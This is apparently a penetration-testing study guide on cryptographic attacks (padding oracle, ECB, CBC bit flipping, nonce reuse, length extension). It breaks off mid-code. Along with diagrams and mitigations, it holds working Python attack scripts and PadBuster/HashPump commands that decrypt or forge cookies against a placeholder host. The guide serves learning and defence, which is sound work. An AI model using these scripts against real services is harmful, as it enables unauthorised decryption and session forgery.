
# 08 - Cryptographic Attacks

> **"Cryptography is typically bypassed, not penetrated."** - Adi Shamir

## Table of Contents

1. [Executive Summary](#executive-summary)
2. [Absolute Beginner's Guide](#absolute-beginners-guide)
3. [Attack Categories Overview](#attack-categories-overview)
4. [Padding Oracle Attacks](#padding-oracle-attacks)
5. [ECB Mode Attacks](#ecb-mode-attacks)
6. [CBC Bit Flipping](#cbc-bit-flipping)
7. [IV/Nonce Reuse Attacks](#ivnonce-reuse-attacks)
8. [Length Extension Attacks](#length-extension-attacks)
9. [Timing Attacks](#timing-attacks)
10. [Downgrade Attacks](#downgrade-attacks)
11. [Key Reuse Vulnerabilities](#key-reuse-vulnerabilities)
12. [Hash Collision Attacks](#hash-collision-attacks)
13. [Real-World Attack Examples](#real-world-attack-examples)
14. [OSCP Relevance](#oscp-relevance)
15. [Hands-On Labs](#hands-on-labs)
16. [Interview Questions](#interview-questions)
17. [Quick Reference](#quick-reference)

---

## Executive Summary

Cryptographic attacks exploit weaknesses not in the mathematical algorithms themselves (which are typically sound), but in:

- **Implementation flaws**: Poor coding, side channels
- **Protocol design errors**: Using crypto incorrectly
- **Mode misuse**: Wrong encryption mode for the use case
- **Key management failures**: Reuse, weak generation, exposure

This guide covers the most common and exploitable cryptographic vulnerabilities you'll encounter in penetration testing and CTF challenges.

```
+-------------------------------------------------------------------+
|                CRYPTOGRAPHIC ATTACK SURFACE                        |
+-------------------------------------------------------------------+

         +------------------+
         |  ALGORITHM       |  (Usually secure: AES, RSA, SHA-256)
         +------------------+
                  |
         +------------------+
         |  MODE OF         |  ECB patterns, CBC padding, CTR nonce
         |  OPERATION       |  <-- COMMON VULNERABILITIES
         +------------------+
                  |
         +------------------+
         |  IMPLEMENTATION  |  Timing leaks, padding oracles
         |                  |  <-- COMMON VULNERABILITIES
         +------------------+
                  |
         +------------------+
         |  KEY MANAGEMENT  |  Reuse, weak generation, storage
         |                  |  <-- COMMON VULNERABILITIES
         +------------------+
                  |
         +------------------+
         |  PROTOCOL        |  Downgrade attacks, replay attacks
         |                  |  <-- COMMON VULNERABILITIES
         +------------------+

+-------------------------------------------------------------------+
```

---

## Absolute Beginner's Guide

### Why Do Cryptographic Attacks Work?

Cryptographic algorithms like AES and RSA are mathematically secure. You won't break AES-256 with math. But the way these algorithms are **used** often creates vulnerabilities.

**Analogy: The Perfect Lock**
```
Imagine you have a perfect, unbreakable lock.

But you:
- Use the same key for every door
- Leave the key under the doormat
- Write the combination on a sticky note
- Tell people "it's my birthday"

The lock is perfect. YOUR USE of it is not.

Cryptographic attacks work the same way!
```

### Categories of Crypto Mistakes

```
+-------------------------------------------------------------------+
|                  CRYPTO IMPLEMENTATION MISTAKES                    |
+-------------------------------------------------------------------+

1. USING THE WRONG MODE
   ECB mode: Same plaintext → Same ciphertext (pattern visible!)
   
   Original Image:          ECB Encrypted:
   +-----------+           +-----------+
   |   HELLO   |    -->    | ######### |
   |   WORLD   |           | @@@@@@@@@ |
   |   HELLO   |           | ######### | <-- Same pattern!
   +-----------+           +-----------+

2. LEAKING INFORMATION
   "Invalid padding" vs "Invalid MAC" tells attacker something
   
   Attacker tries: AAAA → "Invalid padding"
   Attacker tries: AAAB → "Invalid MAC"
   
   Different errors = Different outcomes = Information leak!

3. REUSING VALUES THAT MUST BE UNIQUE
   Using same IV/nonce twice = catastrophic key recovery
   
   XOR property: A ⊕ B ⊕ B = A
   If C1 = M1 ⊕ K and C2 = M2 ⊕ K
   Then C1 ⊕ C2 = M1 ⊕ M2 (key cancelled out!)

4. TRUSTING USER INPUT
   User controls part of encrypted data → can manipulate it
   Cookie: role=user → attacker flips bits → role=admn

+-------------------------------------------------------------------+
```

### How Attacks Generally Work

```
STEP 1: Find a "side channel" or "oracle"
        Something that gives you extra information
        
STEP 2: Make many queries/attempts
        Each response reveals a bit of information
        
STEP 3: Piece together the secret
        Combine all leaked bits to recover key/plaintext

Example - Padding Oracle:
  Try decrypt(ciphertext_modified_1) → "Padding OK"
  Try decrypt(ciphertext_modified_2) → "Padding Bad"
  Try decrypt(ciphertext_modified_3) → "Padding OK"
  ...
  After many tries, reconstruct the plaintext!
```

---

## Attack Categories Overview

### Attack Classification Matrix

```
+-------------------------------------------------------------------+
|              CRYPTOGRAPHIC ATTACK CLASSIFICATION                   |
+-------------------------------------------------------------------+

BY TARGET:
  +-- Confidentiality Attacks (reveal plaintext)
  |     - Padding oracle
  |     - ECB pattern analysis
  |     - Stream cipher key reuse
  |
  +-- Integrity Attacks (modify data undetected)
  |     - CBC bit flipping
  |     - Length extension
  |     - Hash collision
  |
  +-- Authentication Attacks (bypass auth)
        - Timing attacks
        - Replay attacks
        - Downgrade attacks

BY METHOD:
  +-- Implementation Attacks
  |     - Side channels (timing, power, EM)
  |     - Error oracles (padding, MAC)
  |     - Memory attacks (cold boot)
  |
  +-- Protocol Attacks
  |     - Downgrade (force weak crypto)
  |     - Man-in-the-middle
  |     - Replay
  |
  +-- Mathematical Attacks (rare, hard)
        - Factoring (RSA with small keys)
        - Discrete log (weak DH groups)
        - Collision finding (MD5, SHA1)

+-------------------------------------------------------------------+
```

### Vulnerability to Attack Mapping

```
+-------------------------------------------------------------------+
|         VULNERABILITY → ATTACK MAPPING                             |
+-------------------------------------------------------------------+

VULNERABILITY           | ATTACK              | IMPACT
------------------------|---------------------|---------------------
ECB mode used           | Pattern analysis    | Plaintext revealed
CBC with padding errors | Padding oracle      | Full decryption
Same IV reused (CBC)    | IV reuse attack     | First block XOR
Same nonce (stream)     | XOR attack          | Key/plaintext recovery
Hash without HMAC       | Length extension    | Forge signatures
strcmp() for secrets    | Timing attack       | Secret extraction
Weak TLS config         | Downgrade           | MITM possible
MD5/SHA1 signatures     | Collision           | Forge certificates

+-------------------------------------------------------------------+
```

---

## Padding Oracle Attacks

### Understanding PKCS#7 Padding

Before understanding the attack, you must understand padding:

```
+-------------------------------------------------------------------+
|                     PKCS#7 PADDING                                 |
+-------------------------------------------------------------------+

Block ciphers like AES encrypt fixed-size blocks (16 bytes).
If plaintext isn't a multiple of 16, we need PADDING.

PKCS#7 Rule: Pad with N bytes, each byte has value N

Examples (| marks byte boundaries, block size = 8 for clarity):

"HELLO" (5 bytes) → needs 3 bytes padding
  H E L L O 03 03 03
  
"YELLOW" (6 bytes) → needs 2 bytes padding
  Y E L L O W 02 02
  
"ABCDEFG" (7 bytes) → needs 1 byte padding
  A B C D E F G 01
  
"ABCDEFGH" (8 bytes) → needs FULL BLOCK of padding!
  A B C D E F G H | 08 08 08 08 08 08 08 08

VALIDATION:
  Valid:   ...data... 03 03 03      ✓ Last byte is 03, previous 2 are 03
  Valid:   ...data... 01            ✓ Last byte is 01
  Invalid: ...data... 03 03 04      ✗ Last byte says 4, but byte -2 isn't 04
  Invalid: ...data... 00            ✗ Zero is never valid padding

+-------------------------------------------------------------------+
```

### The Padding Oracle Concept

```
+-------------------------------------------------------------------+
|                    PADDING ORACLE ATTACK                           |
+-------------------------------------------------------------------+

What is an Oracle?
  Something that answers yes/no questions about secrets.
  
A Padding Oracle:
  Tells you whether decryption produced VALID or INVALID padding.

HOW IT LEAKS INFORMATION:
  
  Decryption process (CBC mode):
  
  Ciphertext Block      Previous Block (or IV)
       |                      |
       v                      v
  [ AES Decrypt ]        [ XOR ]
       |                      |
       +----------+-----------+
                  |
                  v
            Plaintext Block
                  |
                  v
          [ Check Padding ]
                  |
          +-------+-------+
          |               |
       VALID           INVALID
    (HTTP 200)        (HTTP 500)

The attacker can MODIFY the previous block and observe padding results!

+-------------------------------------------------------------------+
```

### Padding Oracle Attack Step-by-Step

```
+-------------------------------------------------------------------+
|              PADDING ORACLE ATTACK MECHANICS                       |
+-------------------------------------------------------------------+

GOAL: Decrypt ciphertext without knowing the key

SETUP:
  - IV (or previous cipher block): C0
  - Target cipher block: C1
  - We want to find plaintext P1
  
CBC DECRYPTION FORMULA:
  P1 = AES_DECRYPT(C1) ⊕ C0
  
  Let's call AES_DECRYPT(C1) as "I1" (intermediate value)
  So: P1 = I1 ⊕ C0

ATTACK STRATEGY:
  If we modify C0 to C0', the plaintext becomes:
  P1' = I1 ⊕ C0'
  
  We can choose C0' to make P1' have valid padding!

FINDING THE LAST BYTE:
  
  For each value of C0'[15] from 0x00 to 0xFF:
    - Modify last byte: C0'[15] = test_value
    - Send C0' || C1 to server
    - If server says "Valid padding" → we found something!
  
  When padding is valid with byte 0x01:
    P1'[15] = I1[15] ⊕ C0'[15] = 0x01
    
  Therefore:
    I1[15] = C0'[15] ⊕ 0x01
    
  And original plaintext:
    P1[15] = I1[15] ⊕ C0[15]

FINDING THE SECOND-TO-LAST BYTE:
  
  Now we need padding of 0x02 0x02
  - Set C0'[15] = I1[15] ⊕ 0x02 (makes last byte 0x02)
  - Brute force C0'[14] until valid padding
  
  Continue for all 16 bytes!

+-------------------------------------------------------------------+
```

### Visual Attack Flow

```
Original:
+--------+     +--------+
|   C0   | --> |   C1   | --> [ Server ] --> Response
| (IV)   |     | cipher |
+--------+     +--------+

Attack iteration 1 (finding byte 15):
+--------+     +--------+
| C0'    | --> |   C1   | --> [ Server ] --> Valid/Invalid?
| ??..X  |     | cipher |
+--------+     +--------+
       ^
       |__ Try X = 0x00, 0x01, 0x02, ... 0xFF

When X makes padding valid:
  I1[15] = X ⊕ 0x01
  P1[15] = I1[15] ⊕ C0[15]  --> PLAINTEXT BYTE RECOVERED!

Attack iteration 2 (finding byte 14):
+--------+     +--------+
| C0'    | --> |   C1   | --> [ Server ] --> Valid/Invalid?
| ?.XY   |     | cipher |
+--------+     +--------+
     ^^
     ||__ Y = I1[15] ⊕ 0x02  (ensure last byte decrypts to 0x02)
     |___ Try X = 0x00 to 0xFF

Continue until all 16 bytes recovered!
```

### Padding Oracle Attack Tool: PadBuster

```bash
# Installation
apt install padbuster

# Basic usage
padbuster <URL> <EncryptedSample> <BlockSize> [options]

# Example: Decrypt a cookie
padbuster "http://target.com/profile?cookie=ENCRYPTED" \
  "ENCRYPTED_VALUE" 16 \
  -encoding 0 \
  -cookies "session=ENCRYPTED_VALUE"

# Options:
# -encoding: 0=Base64, 1=Hex, 2=URL, 3=Web64
# -error: String that indicates padding error
# -prefix: Data to prepend to payload
# -plaintext: Plaintext to encrypt (for forging)

# Encrypt arbitrary data (forge cookies)
padbuster "http://target.com/page" \
  "ENCRYPTED_VALUE" 16 \
  -encoding 0 \
  -plaintext "admin=1"
```

### Python Padding Oracle Implementation

```python
#!/usr/bin/env python3
"""
Padding Oracle Attack Implementation
Educational purposes only
"""

import requests
from base64 import b64encode, b64decode

def oracle(ciphertext_b64):
    """
    Returns True if padding is valid, False otherwise
    This function queries the target server
    """
    url = f"http://target.com/decrypt?data={ciphertext_b64}"
    response = requests.get(url)
    # Adjust based on actual server response
    return "Invalid padding" not in response.text

def xor_bytes(a, b):
    """XOR two byte strings"""
    return bytes(x ^ y for x, y in zip(a, b))

def attack_block(prev_block, cipher_block, block_size=16):
    """
    Recover plaintext of cipher_block using padding oracle
    """
    intermediate = bytearray(block_size)
    plaintext = bytearray(block_size)
    
    # Attack each byte from last to first
    for byte_pos in range(block_size - 1, -1, -1):
        padding_value = block_size - byte_pos
        
        # Prepare the attack block
        attack_prev = bytearray(block_size)
        
        # Set already-found bytes to produce correct padding
        for i in range(byte_pos + 1, block_size):
            attack_prev[i] = intermediate[i] ^ padding_value
        
        # Brute force current byte
        for guess in range(256):
            attack_prev[byte_pos] = guess
            
            # Construct ciphertext: modified_prev || target_block
            test_cipher = bytes(attack_prev) + cipher_block
            test_b64 = b64encode(test_cipher).decode()
            
            if oracle(test_b64):
                # Found valid padding!
                intermediate[byte_pos] = guess ^ padding_value
                plaintext[byte_pos] = intermediate[byte_pos] ^ prev_block[byte_pos]
                print(f"Byte {byte_pos}: {chr(plaintext[byte_pos])}")
                break
    
    return bytes(plaintext)

def padding_oracle_attack(ciphertext):
    """
    Full padding oracle attack
    """
    block_size = 16
    blocks = [ciphertext[i:i+block_size] 
              for i in range(0, len(ciphertext), block_size)]
    
    plaintext = b""
    
    # First block is IV
    for i in range(1, len(blocks)):
        print(f"Attacking block {i}...")
        block_plaintext = attack_block(blocks[i-1], blocks[i])
        plaintext += block_plaintext
    
    return plaintext

# Usage
if __name__ == "__main__":
    encrypted_b64 = "BASE64_ENCODED_CIPHERTEXT"
    ciphertext = b64decode(encrypted_b64)
    recovered = padding_oracle_attack(ciphertext)
    print(f"Recovered plaintext: {recovered}")
```

### Mitigations for Padding Oracle

```
+-------------------------------------------------------------------+
|              PADDING ORACLE MITIGATIONS                            |
+-------------------------------------------------------------------+

1. USE AUTHENTICATED ENCRYPTION
   - AES-GCM, ChaCha20-Poly1305
   - Verify MAC before decrypting
   - Attacker can't modify ciphertext without detection

2. ENCRYPT-THEN-MAC (if not using AEAD)
   - Compute HMAC over ciphertext
   - Verify HMAC first, before any decryption
   - Invalid HMAC = reject immediately

3. CONSTANT-TIME RESPONSES
   - Same error message for all failures
   - Same response time for all failures
   - Don't reveal padding vs MAC errors

4. AVOID CBC MODE IF POSSIBLE
   - Use CTR or GCM modes
   - No padding needed = no padding oracle

WRONG:
  if decrypt(ciphertext):
      if verify_mac(plaintext):
          return "Success"
      else:
          return "Invalid MAC"      # Leaks info!
  else:
      return "Padding error"        # Leaks info!

RIGHT:
  mac_valid = verify_mac(ciphertext)  # Check MAC first
  if not mac_valid:
      return "Error"                   # Generic error
  # Only decrypt after MAC verified

+-------------------------------------------------------------------+
```

---

## ECB Mode Attacks

### Why ECB is Dangerous

```
+-------------------------------------------------------------------+
|                    ECB MODE VULNERABILITY                          |
+-------------------------------------------------------------------+

ECB (Electronic Codebook) encrypts each block independently:

Block 1: "ATTACKATD" → AES → "x9#kL..."
Block 2: "AWNATTACK" → AES → "pQ2m..."
Block 3: "ATTACKATD" → AES → "x9#kL..."  ← SAME plaintext = SAME cipher!

PROBLEM: Patterns in plaintext are preserved in ciphertext!

THE FAMOUS ECB PENGUIN:

Original Image:          ECB Encrypted:        CBC Encrypted:
+-------------+        +-------------+        +-------------+
|    🐧       |   →    |    🐧       |   →    | ########    |
|   penguin   |        |   visible   |        | random      |
|   outline   |        |   pattern!  |        | noise       |
+-------------+        +-------------+        +-------------+

+-------------------------------------------------------------------+
```

### ECB Block Manipulation Attack

```
+-------------------------------------------------------------------+
|                ECB BLOCK MANIPULATION                              |
+-------------------------------------------------------------------+

SCENARIO: Web app encrypts user role in cookie

Original request:
  username: "admin"
  role: "user"

Server creates:
  Plaintext: "username=admin&role=user&token=abc123"
  
  Block 1: "username=admin&r"
  Block 2: "ole=user&token=a"
  Block 3: "bc123&padding..."

Encrypted: [Block1_enc][Block2_enc][Block3_enc]

ATTACK: Create account with crafted username!

Malicious registration:
  username: "admin&role=adminX"  (X = padding to align blocks)
  
  Block 1: "username=admin&r"
  Block 2: "ole=admin&role=a"
  Block 3: "dminX&role=user&"  ← Contains "role=admin"!

Now attacker can REORDER blocks to forge "role=admin"

+-------------------------------------------------------------------+
```

### ECB Byte-at-a-Time Attack

This attack lets you decrypt ECB-encrypted data one byte at a time:

```
+-------------------------------------------------------------------+
|              ECB BYTE-AT-A-TIME ATTACK                             |
+-------------------------------------------------------------------+

SCENARIO:
  Server encrypts: user_input || secret_data
  Attacker controls user_input
  Block size: 16 bytes

SETUP:
  Secret: "FLAG{s3cr3t_fl4g}"
  Attacker input: "AAAAAAAAAAAAAAA" (15 A's)
  
  Block 1: "AAAAAAAAAAAAAAAF"
                           ^-- First byte of secret in our block!

ATTACK STEP 1:
  Send: "A" * 15
  
  Server encrypts: "AAAAAAAAAAAAAAAF" | "LAG{s3cr3t_fl4g}"
                   Block 1 (known!)    Block 2
  
  Record ciphertext of Block 1: "Enc(AAAAAAAAAAAAAAAF)"

ATTACK STEP 2:
  Brute force the last byte! Try:
  - "AAAAAAAAAAAAAAA" + "A" → Encrypt → Compare with Block 1
  - "AAAAAAAAAAAAAAA" + "B" → Encrypt → Compare with Block 1
  - "AAAAAAAAAAAAAAA" + "C" → Encrypt → Compare with Block 1
  ...
  - "AAAAAAAAAAAAAAA" + "F" → Encrypt → MATCH! First byte is 'F'

ATTACK STEP 3:
  Now we know first byte. Send: "A" * 14
  
  Block 1: "AAAAAAAAAAAAAFL"
           Known byte --^   ^-- Second secret byte
  
  Brute force again...
  
Continue until entire secret is recovered!

+-------------------------------------------------------------------+
```

### Python ECB Byte-at-a-Time Implementation

```python
#!/usr/bin/env python3
"""
ECB Byte-at-a-Time Oracle Attack
"""

import requests
from base64 import b64encode, b64decode
from string import printable

def encrypt_oracle(plaintext):
    """
    Calls the server to encrypt data
    Server encrypts: user_input || secret
    """
    response = requests.post(
        "http://target.com/encrypt",
        data={"input": plaintext}
    )
    return b64decode(response.text)

def find_block_size():
    """Detect cipher block size"""
    initial = len(encrypt_oracle("A"))
    for i in range(2, 64):
        new_len = len(encrypt_oracle("A" * i))
        if new_len > initial:
            return new_len - initial
    return None

def ecb_byte_at_a_time_attack():
    block_size = find_block_size()
    print(f"Block size: {block_size}")
    
    # Find length of secret
    base_len = len(encrypt_oracle(""))
    
    secret = ""
    
    for i in range(base_len):
        # Calculate padding to align target byte
        block_num = (len(secret) + 1) // block_size
        padding_len = block_size - 1 - (len(secret) % block_size)
        padding = "A" * padding_len
        
        # Get reference ciphertext
        reference = encrypt_oracle(padding)
        target_block = reference[block_num * block_size:(block_num + 1) * block_size]
        
        # Brute force the byte
        found = False
        for c in printable:
            test_input = padding + secret + c
            test_cipher = encrypt_oracle(test_input)
            test_block = test_cipher[block_num * block_size:(block_num + 1) * block_size]
            
            if test_block == target_block:
                secret += c
                print(f"Found: {secret}")
                found = True
                break
        
        if not found:
            print("Could not find next byte. Stopping.")
            break
    
    return secret

if __name__ == "__main__":
    recovered = ecb_byte_at_a_time_attack()
    print(f"Secret: {recovered}")
```

### ECB Cut-and-Paste Attack

```
+-------------------------------------------------------------------+
|                   ECB CUT-AND-PASTE ATTACK                         |
+-------------------------------------------------------------------+

SCENARIO: User registration creates encrypted profile

register("user@mail.com") creates:
  "email=user@mail.com&role=user"

Encrypted in 16-byte blocks:
  Block 0: "email=user@mail."
  Block 1: "com&role=user###"  (# = padding)

GOAL: Change role=user to role=admin

STEP 1: Register with email that aligns "admin" in its own block

  Email: "AAAAAAAAAAadmin"  (10 A's + "admin")
  
  Created: "email=AAAAAAAAAAdminAAAAAAAAAAAA&role=user"
  
  Wait, that doesn't work. Let's try:
  
  Email: "foo@bar.comadmin"
  
  Block 0: "email=foo@bar.co"
  Block 1: "madmin&role=user"   ← "admin" not isolated

STEP 2: Better approach - craft email to get "admin" block

  Email: "AAAAAAAAAA" + "admin\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b" + "@x.co"
                        ^-- "admin" + valid padding
  
  Block 0: "email=AAAAAAAAAA"
  Block 1: "admin\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b"  ← Isolated "admin" with padding!
  Block 2: "@x.co&role=user#"

STEP 3: Create normal account

  Email: "AAAAAAAAAA@x.co"
  
  Block 0: "email=AAAAAAAAAA"
  Block 1: "@x.co&role=user#"

STEP 4: Replace Block 1 with "admin" block from Step 2

  Final: Block0 (Step 3) + Block1 (Step 2)
  
  Decrypts to: "email=AAAAAAAAAA" + "admin\x0b\x0b..."
             = Valid admin profile!

+-------------------------------------------------------------------+
```

---

## CBC Bit Flipping

### How CBC Decryption Works

```
+-------------------------------------------------------------------+
|                    CBC DECRYPTION                                  |
+-------------------------------------------------------------------+

       Ciphertext Block 1    Ciphertext Block 2
             |                     |
             v                     v
       +----------+          +----------+
       |   AES    |          |   AES    |
       | Decrypt  |          | Decrypt  |
       +----------+          +----------+
             |                     |
             v                     v
     Intermediate 1          Intermediate 2
             |                     |
      +------+                     |
      |                            |
      v                            v
    [ XOR ] <---- IV         [ XOR ] <---- Ciphertext Block 1
      |                            |
      v                            v
   Plaintext 1               Plaintext 2

KEY INSIGHT:
  Plaintext[n] = Decrypt(Ciphertext[n]) XOR Ciphertext[n-1]

If we flip a bit in Ciphertext[n-1]:
  - Block n-1 becomes garbage (destroyed)
  - Block n has a flipped bit at the same position!

+-------------------------------------------------------------------+
```

### CBC Bit Flip Attack

```
+-------------------------------------------------------------------+
|                   CBC BIT FLIP ATTACK                              |
+-------------------------------------------------------------------+

SCENARIO: Cookie contains "role=user"

Plaintext blocks (16 bytes each):
  Block 0: "comment1=cooking"
  Block 1: ";role=user;comme"
  Block 2: "nt2=browsing####"

GOAL: Change "user" to "admn" (same length!)

Target: "role=user" at position in Block 1
        Specifically: 'u' at position 6 within block 1

To flip 'u' (0x75) to 'a' (0x61):
  XOR difference: 0x75 ^ 0x61 = 0x14

ATTACK:
  Flip byte at position 6 in Ciphertext Block 0
  
  Original C0[6] = X
  Modified C0[6] = X ^ 0x14
  
RESULT:
  Block 0 plaintext: Garbage (corrupted)
  Block 1 plaintext: "role=admn" (modified!)
  Block 2 plaintext: Unchanged

If application only checks role in Block 1, attack succeeds!

+-------------------------------------------------------------------+
```

### Visual CBC Bit Flip

```
BEFORE:
IV/C0: [A B C D E F G H I J K L M N O P]
                ^
                |__ We will flip this byte

C1:   [encrypted block 1 data...........]

Decrypts to: ";role=user;comme"
                   ^
                   |__ This 'u' will change

AFTER FLIP:
IV/C0: [A B C D E F G' H I J K L M N O P]  (G → G' via XOR)
                ^
                |__ Flipped!

Decrypts to: ";role=admn;comme"
                   ^
                   |__ Now 'a'!

The XOR applied to ciphertext byte propagates to plaintext byte!
```

### Python CBC Bit Flip Implementation

```python
#!/usr/bin/env python3
"""
CBC Bit Flipping Attack
"""

from base64 import b64encode, b64decode
import requests

def get_encrypted_cookie():
    """Get encrypted cookie from server"""
    response = requests.get("http://target.com/")
    return b64decode(response.cookies.get("session"))

def send_modified_cookie(cookie):
    """Send modified cookie to server"""
    response = requests.get(
        "http://target.com/admin",
        cookies={"session": b64encode(cookie).decode()}
    )
    return response.text

def cbc_bitflip_attack():
    """
    Original plaintext (hypothetical):
    Block 0: "username=guest;r"
    Block 1: "ole=user;comment"
    
    Goal: Change "user" to "admn"
    """
    cookie = bytearray(get_encrypted_cookie())
    
    # Position of 'u' in plaintext (start of "user")
    # If "ole=user" is in block 1, and we're targeting 'u'
    # Position in block 1: 4 (o=0, l=1, e=2, ==3, u=4)
    # We modify position 4 in block 0 (previous cipher block)
    
    target_pos = 4  # Position in the block
    block_size = 16
    
    # Characters to flip
    original = ord('u')  # 0x75
    target = ord('a')    # 0x61
    xor_diff = original ^ target  # 0x14
    
    # Apply XOR to previous block
    cookie[target_pos] ^= xor_diff
    
    # Similarly for 's' → 'd', 'e' → 'm', 'r' → 'n'
    # 's' (0x73) → 'd' (0x64) = 0x17
    cookie[target_pos + 1] ^= 0x73 ^ 0x64
    # 'e' (0x65) → 'm' (0x6d) = 0x08
    cookie[target_pos + 2] ^= 0x65 ^ 0x6d
    # 'r' (0x72) → 'n' (0x6e) = 0x1c
    cookie[target_pos + 3] ^= 0x72 ^ 0x6e
    
    # Send modified cookie
    result = send_modified_cookie(bytes(cookie))
    print(result)

if __name__ == "__main__":
    cbc_bitflip_attack()
```

### CBC Bit Flip Mitigations

```
+-------------------------------------------------------------------+
|                CBC BIT FLIP MITIGATIONS                            |
+-------------------------------------------------------------------+

1. USE AUTHENTICATED ENCRYPTION
   AES-GCM, ChaCha20-Poly1305
   Any modification invalidates the authentication tag

2. ENCRYPT-THEN-MAC
   MAC covers the ciphertext
   Modified ciphertext fails MAC verification

3. INCLUDE INTEGRITY CHECKS IN PLAINTEXT
   Add HMAC or checksum of critical fields
   Validate checksum after decryption

4. AVOID SENSITIVE DATA IN ENCRYPTED COOKIES
   Store session ID only, look up data server-side
   Can't flip what isn't there

+-------------------------------------------------------------------+
```

---

## IV/Nonce Reuse Attacks

### Why Nonce Reuse is Catastrophic

```
+-------------------------------------------------------------------+
|                    NONCE REUSE DISASTER                            |
+-------------------------------------------------------------------+

STREAM CIPHERS (and CTR mode):
  Generate keystream: K = cipher(key, nonce, counter)
  Ciphertext: C = P ⊕ K

If same nonce is used twice:
  C1 = P1 ⊕ K
  C2 = P2 ⊕ K

Attacker computes:
  C1 ⊕ C2 = (P1 ⊕ K) ⊕ (P2 ⊕ K)
          = P1 ⊕ P2    ← KEY CANCELLED OUT!

With P1 ⊕ P2, if attacker knows P1, they recover P2.
Even without known plaintext, statistical analysis can recover both!

REAL-WORLD EXAMPLE: Xbox 360 Signing Key
  Microsoft reused ECDSA nonce
  Attackers recovered private signing key
  Led to piracy and homebrew

+-------------------------------------------------------------------+
```

### CTR Mode Nonce Reuse Attack

```
+-------------------------------------------------------------------+
|                 CTR MODE NONCE REUSE                               |
+-------------------------------------------------------------------+

CTR Mode Encryption:
                  +-------+
  Nonce || Counter → | AES | → Keystream
                  +-------+
                      |
  Plaintext -------→ XOR → Ciphertext
  
If nonce repeats with different counter values = OK
If nonce AND counter repeat = DISASTER

Example:
  Message 1: "ATTACK AT DAWN"
  Message 2: "DEFEND THE BASE"
  
  Both encrypted with nonce=0x12345678
  
  C1 ⊕ C2 = "ATTACK AT DAWN" ⊕ "DEFEND THE BASE"
  
  With crib (known text), attacker decrypts both!

+-------------------------------------------------------------------+
```

### GCM Nonce Reuse Attack

```
+-------------------------------------------------------------------+
|                 GCM NONCE REUSE ATTACK                             |
+-------------------------------------------------------------------+

GCM provides authenticated encryption with a nonce.

If nonce is reused:
  1. XOR attack recovers plaintexts (like CTR)
  2. AUTHENTICATION KEY (H) is leaked!
  
With H, attacker can:
  - Forge valid authentication tags
  - Create fake authenticated messages
  
This is WORSE than just losing confidentiality!

PREVENTION:
  - Use random 96-bit nonces
  - Or use deterministic nonce from unique message ID
  - Never increment manually without extreme care
  
Microsoft TLS 1.3 bug (CVE-2020-1596):
  Nonce reuse in GCM allowed authentication bypass

+-------------------------------------------------------------------+
```

### Many-Time Pad Attack (Crib Dragging)

```
+-------------------------------------------------------------------+
|                   CRIB DRAGGING ATTACK                             |
+-------------------------------------------------------------------+

When stream cipher nonce is reused:
  C1 = P1 ⊕ K
  C2 = P2 ⊕ K
  C1 ⊕ C2 = P1 ⊕ P2

CRIB DRAGGING:
  Guess a common word (crib): "the "
  
  XOR crib with C1 ⊕ C2 at each position:
  
  Position 0: "the " ⊕ (C1 ⊕ C2)[0:4] = ?
              If result looks like English → crib found!
  
  Position 1: "the " ⊕ (C1 ⊕ C2)[1:5] = ?
              Continue...

  Common cribs: "the ", "and ", "ing ", "tion", " is ", etc.

AUTOMATION:
  Tools like `xortool` and `cribdrag` automate this

Example with xortool:
  $ xortool-xor -r c1.bin c2.bin > xored.bin
  $ xortool xored.bin
  
+-------------------------------------------------------------------+
```

### Python Crib Drag Example

```python
#!/usr/bin/env python3
"""
Simple Crib Dragging Attack
"""

def xor_bytes(a, b):
    return bytes(x ^ y for x, y in zip(a, b))

def crib_drag(cipher_xor, crib):
    """
    Drag a crib across XOR of two ciphertexts
    """
    results = []
    crib_bytes = crib.encode()
    
    for i in range(len(cipher_xor) - len(crib_bytes) + 1):
        result = xor_bytes(cipher_xor[i:i+len(crib_bytes)], crib_bytes)
        try:
            decoded = result.decode('ascii')
            if decoded.isprintable():
                results.append((i, decoded))
        except:
            pass
    
    return results

# Example usage
c1 = bytes.fromhex("...")  # First ciphertext
c2 = bytes.fromhex("...")  # Second ciphertext (same key!)

xored = xor_bytes(c1, c2)

# Try common cribs
cribs = ["the ", "and ", " is ", "that", "this", "with"]
for crib in cribs:
    results = crib_drag(xored, crib)
    for pos, text in results:
        print(f"Crib '{crib}' at position {pos}: found '{text}'")
```

---

## Length Extension Attacks

### Vulnerable Hash Constructions

```
+-------------------------------------------------------------------+
|                  LENGTH EXTENSION ATTACK                           |
+-------------------------------------------------------------------+

VULNERABLE PATTERN:
  signature = H(secret || message)
  
  Where H is MD5, SHA-1, or SHA-256 (Merkle-Damgård construction)

ATTACK:
  Given: signature = MD5(secret || message)
  Create: signature' = MD5(secret || message || padding || extension)
  
  WITHOUT knowing the secret!

WHY IT WORKS:
  Merkle-Damgård hashes process blocks iteratively:
  
  H(m) = final_state after processing all blocks
  
  If we know H(secret || message), we know the internal state
  We can CONTINUE hashing from that state!
  
  H(secret || message || padding || extension)
  = continue_hash(H(secret || message), extension)

+-------------------------------------------------------------------+
```

### Length Extension Mechanics

```
+-------------------------------------------------------------------+
|              LENGTH EXTENSION MECHANICS                            |
+-------------------------------------------------------------------+

Original: secret || message
  
MD5 Processing:
  [initial state] → Block 1 → Block 2 → ... → [Final Hash = signature]

Length Extension:
  
  We don't know secret, but we know:
    - Length of (secret || message)
    - The final hash (signature)
  
  MD5 padding for original:
    secret || message || 0x80 || zeros || length_bits
  
  We can calculate this padding!
  
  Now append our data:
    secret || message || [padding] || malicious_extension
  
  Continue hashing from known signature:
    [signature as state] → [extension blocks] → [new_signature]

RESULT:
  new_signature is valid for:
    secret || message || padding || extension

+-------------------------------------------------------------------+
```

### HashPump Tool

```bash
# Installation (Kali/Ubuntu)
apt install hashpump

# Or compile from source
git clone https://github.com/bwall/HashPump
cd HashPump
make
sudo make install

# Usage
hashpump -s <original_sig> -d <original_data> -k <key_length> -a <append_data>

# Example:
# Original: sig = MD5(secret + "data=user")
# Goal: Forge sig for "data=user[padding]&admin=true"

hashpump -s "e7d2c5f8a3b9..." \
         -d "data=user" \
         -k 16 \              # Secret length (may need to guess)
         -a "&admin=true"

# Output:
# New signature: "a1b2c3d4e5f6..."
# New data (hex): "646174613d75736572800000...2661646d696e3d74727565"
```

### Python Length Extension Attack

```python
#!/usr/bin/env python3
"""
MD5 Length Extension Attack
Using hlextend library
"""

# pip install hlextend
import hlextend

def length_extension_attack():
    """
